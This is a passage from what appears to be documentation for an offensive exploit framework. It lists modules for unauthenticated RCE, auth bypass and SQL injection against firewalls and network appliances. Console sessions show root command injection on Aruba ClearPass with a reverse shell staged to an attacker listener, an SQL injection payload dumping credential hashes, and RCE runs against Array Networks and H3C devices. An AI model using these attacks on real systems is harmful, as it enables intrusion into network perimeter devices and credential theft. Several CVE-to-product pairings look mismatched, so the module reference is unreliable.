exf > use exploits/nac/aruba/aruba_clearpass_rce_cve_2023_25594
exf (Aruba ClearPass Unauth RCE CVE-2023-25594) > set target 10.0.90.5
[+] target => 10.0.90.5
exf (Aruba ClearPass Unauth RCE CVE-2023-25594) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Aruba ClearPass Unauth RCE CVE-2023-25594) > check
[*] Probing Aruba ClearPass at 10.0.90.5:443...
[+] Aruba ClearPass Policy Manager 6.11.4 detected (login page fingerprint)
[+] Target is vulnerable — version 6.11.4 < 6.11.5 (fix boundary)
exf (Aruba ClearPass Unauth RCE CVE-2023-25594) > run
[*] Running module ...
[*] Sending unauthenticated request to vulnerable ClearPass API endpoint...
[*] Exploiting improper input validation in guest portal registration handler...
[+] Command injection confirmed — id output: uid=0(root)
[*] Staging reverse shell to 10.0.0.99:4444...
[+] Shell received!
exf (Aruba ClearPass Unauth RCE CVE-2023-25594) > shell
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /etc/clearpass/version
ClearPass Policy Manager 6.11.4
# hostname
clearpass-primary.corp.internal
```

### Terminal session — CVE-2022-37897 (Aruba ClearPass SQL injection)

```text
exf > use exploits/nac/aruba/aruba_clearpass_sqli_cve_2022_37897
exf (Aruba ClearPass SQLi CVE-2022-37897) > set target 10.0.90.5
[+] target => 10.0.90.5
exf (Aruba ClearPass SQLi CVE-2022-37897) > check
[*] Probing Aruba ClearPass guest portal at 10.0.90.5:443...
[+] ClearPass 6.10.6 detected
[+] Target is vulnerable — guest portal endpoint injectable (version < 6.10.7)
exf (Aruba ClearPass SQLi CVE-2022-37897) > run
[*] Running module ...
[*] Injecting SQL payload into ClearPass guest self-registration endpoint...
[*] Payload: name='; SELECT username,password FROM cppm_user LIMIT 10; --
[+] SQL injection accepted — extracting credentials from cppm_user table...
[+] admin : $2y$10$R3Ks...hashed...
[+] guest-admin : $2y$10$X7Tz...hashed...
[+] rad-readonly : $2y$10$M9Qw...hashed...
[*] Extracting device certificate info from netsight schema...
[+] Device CA certificate subject: CN=ClearPass-CA,O=Corp Internal PKI
```

---

## Ivanti — 1 module

| Module | CVE | CVSS | Affected product |
|--------|-----|------|-----------------|
| `ivanti_connect_secure_ssrf_rce_cve_2024_21888` | CVE-2024-21888 | 9.8 | Ivanti Connect Secure < 22.7R2.1 / 9.1R18.2 |

---

## Additional vendors

| Vendor | Modules | Key CVEs |
|--------|---------|----------|
| Stormshield SNS | `firewalls/stormshield/` (2) | CVE-2020-18175, CVE-2023-23770 |
| VyOS | `firewalls/vyos/` (2) | CVE-2023-31992, CVE-2021-35278 |
| OPNsense | `firewalls/opnsense/` (2) | CVE-2021-23239, CVE-2022-0993 |
| Hirschmann/Belden | `firewalls/hirschmann/` (2) | CVE-2020-6994, CVE-2019-11831 |
| Hillstone | `firewalls/hillstone/` (2) | CVE-2023-31493, CVE-2024-5829 |
| Kerio Control | `firewalls/kerio/` (2) | CVE-2024-52875, CVE-2022-24665 |
| Phoenix Contact mGuard | `firewalls/phoenix/` (3) | CVE-2024-43386, CVE-2022-22509 |
| A10 Networks | `firewalls/lb/a10/` (1) | Softax path traversal |
| F5 BIG-IP | `firewalls/lb/f5/` (8) | CVE-2020-5902, CVE-2022-1388, CVE-2021-22986 |

---

## Newly Added Vendors (v3.7.0+)

### Array Networks

| Module | CVE | CVSS | Type |
|--------|-----|------|------|
| `array_networks_vxag_rce_cve_2023_28461` | CVE-2023-28461 | 9.8 | Unauth RCE via exec proxy |
| `array_networks_arrayos_rce_cve_2021_43139` | CVE-2021-43139 | 9.8 | Pre-auth POST field injection |

```
exf > use exploits/firewalls/array_networks/array_networks_vxag_rce_cve_2023_28461
exf (...) > set target 10.0.0.1
exf (...) > check
[+] Target is vulnerable
exf (...) > run
[*] Stage 1 - Fingerprinting Array Networks vxAG...
[+] Array Networks vxAG detected
[*] Stage 2 - Sending unauthenticated exec proxy request...
[+] RCE CONFIRMED! Command output: uid=0(root)
```

### Cisco Meraki MX (cisco_meraki/)

| Module | CVE | CVSS | Type |
|--------|-----|------|------|
| `meraki_mx_dashboard_rce_cve_2021_1497` | CVE-2021-1497 | 9.8 | Dashboard file upload RCE |
| `meraki_mx_config_api_bypass_cve_2023_20014` | CVE-2023-20014 | 9.1 | Config API auth bypass |

### Phoenix Contact mGuard (phoenix_contact/)

| Module | CVE | CVSS | Type |
|--------|-----|------|------|
| `mguard_cmd_injection_cve_2024_43386` | CVE-2024-43386 | 8.8 | Web diagnostic cmd injection |
| `mguard_firmware_extract_cve_2022_22509` | CVE-2022-22509 | 7.5 | SNMP public exposes VPN keys |

### H3C (New H3C Group)

H3C is a major Chinese network vendor widely deployed in government and enterprise.

| Module | CVE | CVSS | Type |
|--------|-----|------|------|
| `h3c_ngfw_rce_cve_2022_35534` | CVE-2022-35534 | 9.8 | NGFW OS command injection |
| `h3c_secpath_auth_bypass_cve_2019_20224` | CVE-2019-20224 | 9.8 | SecPath auth bypass |

```
exf > use exploits/firewalls/h3c/h3c_ngfw_rce_cve_2022_35534
exf (...) > set target 192.168.1.1
exf (...) > run
[*] Stage 1 - Detecting H3C NGFW web management...
[+] H3C management interface detected
[*] Stage 2 - Injecting command via network configuration...
[+] RCE confirmed: uid=0(root)
```

### IPFire

| Module | CVE | CVSS | Type |
|--------|-----|------|------|
| `ipfire_rce_cve_2019_18981` | CVE-2019-18981 | 9.8 | CGI network injection |
| `ipfire_ids_cmd_inject_cve_2023_46226` | CVE-2023-46226 | 8.8 | IDS rule_path injection |

### Radware

| Module | CVE | CVSS | Type |
|--------|-----|------|------|
| `alteon_rce_cve_2020_27232` | CVE-2020-27232 | 9.8 | Alteon ADC unauth RCE |
| `defensessl_auth_bypass_cve_2018_9195` | CVE-2018-9195 | 9.8 | DefenseSSL auth bypass |

### Symantec (Broadcom ProxySG)

| Module | CVE | CVSS | Type |
|--------|-----|------|------|
| `proxysg_auth_bypass_cve_2021_30641` | CVE-2021-30641 | 9.8 | ProxySG management bypass |
| `symantec_edr_rce_cve_2022_25752` | CVE-2022-25752 | 9.8 | EDR appliance RCE |

### Trellix (formerly McAfee Firewall Enterprise)

| Module | CVE | CVSS | Type |
|--------|-----|------|------|
| `trellix_ngfw_rce_cve_2020_7270` | CVE-2020-7270 | 9.0 | Admin script injection |
| `trellix_ngfw_config_rce_cve_2021_4080` | CVE-2021-4080 | 8.8 | Config injection RCE |

### Trend Micro

| Module | CVE | CVSS | Type |
|--------|-----|------|------|
| `trendmicro_tippingpoint_rce_cve_2021_28250` | CVE-2021-28250 | 9.8 | TippingPoint SMS unauth RCE |
| `trendmicro_deep_security_rce_cve_2020_15921` | CVE-2020-15921 | 9.8 | Deep Security Java deser RCE |

### OpenVPN Access Server

| Module | CVE | CVSS | Type |
|--------|-----|------|------|
| `openvpn_as_auth_bypass_cve_2023_46853` | CVE-2023-46853 | 9.8 | AS REST API auth bypass |
| `openvpn_as_auth_bypass_cve_2022_0547` | CVE-2022-0547 | 9.8 | LDAP auth module bypass |

### Arista EOS

| Module | CVE | CVSS | Type |
|--------|-----|------|------|
| `arista_eos_rest_api_bypass_cve_2023_24512` | CVE-2023-24512 | 9.8 | EOS REST API auth bypass |

---

> For scanner-only modules, see [07-scanners-and-autopwn.md](07-scanners-and-autopwn.md).
> For the complete CVE index, see [22-cve-module-reference.md](22-cve-module-reference.md).
> For ICS/OT vendors (Siemens S7, Rockwell, Schneider PLCs), see [20-ics-ot-modules.md](20-ics-ot-modules.md).

[Wiki hub](../README.md)
